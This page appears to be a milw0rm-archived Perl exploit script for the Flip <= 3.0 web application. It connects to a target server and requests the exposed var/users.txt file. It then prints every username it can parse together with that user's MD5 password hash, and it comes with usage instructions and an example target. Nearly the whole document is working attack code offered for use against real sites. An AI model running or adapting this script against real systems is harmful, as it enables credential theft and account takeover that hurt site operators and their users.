<html><head><title>Flip <= 3.0 Remote Password Hash Disclosure Exploit</title></head><pre>#!/usr/bin/perl

use strict; 
use IO::Socket;

my $app = &quot;Flip &lt;= 3.0&quot;;
my $type = &quot;Passwords Hash Disclosure&quot;;
my $author = &quot;undefined1_&quot;;
my $vendor = &quot;http://sourceforge.net/projects/flipsource&quot;;

banner();
my $server = shift || usage();
my $port = shift || usage();

if($server =~ /http:\/\//)
{
	$server = substr($server,7);
}

my $path = &quot;/&quot;;
if(index($server, &quot;/&quot;) != -1)
{
	$path = substr($server, index($server, &quot;/&quot;));
	$server = substr($server, 0, index($server, &quot;/&quot;));
	if(substr($path, length($path)-1) ne &quot;/&quot;) {
		$path .= &quot;/&quot;;
	}
}

my $data = get($server, $port, $path.&quot;var/users.txt&quot;, &quot;&quot;);
fail() unless $data !~ /404 Not Found/;
my $index1 = index($data, &quot;\r\n\r\n&quot;);
fail() unless $index1 &gt;= 0;

$data = substr($data, $index1+4);
$index1 = 0;
printf (&quot;%-20s %-32s\n&quot;, &quot;username&quot;, &quot;md5 hash&quot;);
while(($index1 = index($data, &quot;\n&quot;)) &gt;= 0)
{	
	my $hash = substr($data, 0, 32);
	my $index2 = index($data, &quot;][&quot;);
	my $index3 = index($data, &quot;][&quot;, $index2+2);
	my $user = &quot;&quot;;
	if($index2 &gt;= 0 &amp;&amp; $index3 &gt;= 0)
	{
		$user = substr($data, $index2+2, $index3-($index2+2));
	}
	printf (&quot;%-20s %-32s\n&quot;, $user, $hash);
	$data = substr($data, $index1+1);
}

###################

sub get(\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $page = shift;
	my $cookies = shift;
	my $query = &quot;GET $page HTTP/1.1\r\n&quot;;
	if($port != 80)
	{
		$query .= &quot;Host: $server:$port\r\n&quot;;
	}
	else
	{
		$query .= &quot;Host: $server\r\n&quot;;
	}

	$query .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.2\r\n&quot;;
	$query .= &quot;Connection: close\r\n&quot;;
	$query .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
	$query .= &quot;Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;
	$query .= &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;;	
	
	if(length($cookies))
	{
		$query .= &quot;Cookie: &quot;.$cookies.&quot;\r\n&quot;;
	}			

	$query .= &quot;\r\n&quot;;
	return sendpacket($server, $port, $query);
}





sub sendpacket(\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $query = shift;
	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, 
				PeerAddr =&gt; $server, PeerPort =&gt; $port) 
				or die &quot;[-] Could not connect to $server:$port $!\n&quot;;
	print $sock $query;
	my $data = &quot;&quot;;
	my $answer;
	while($answer = &lt;$sock&gt;)
	{
		$data .= $answer;
	}

	close($sock);
	return $data;
}



###################



sub fail() {
	print &quot;[-] exploit failed\n&quot;;
	exit;
}



sub banner() {
	print &quot;:: Flip &lt;= 3.0 password hash disclosure exploit\n&quot;;
	print &quot;:: by undefined1_ @ www.undef1.com\n\n\n&quot;;
}



sub usage() {
	print &quot;usage  : ./flip_pass.pl &lt;target&gt; &lt;port&gt;\n&quot;;
	print &quot;example: ./flip_pass.pl www.abcd.com/flip/ 80\n&quot;;
	exit;
}

# milw0rm.com [2007-09-20]</pre></html>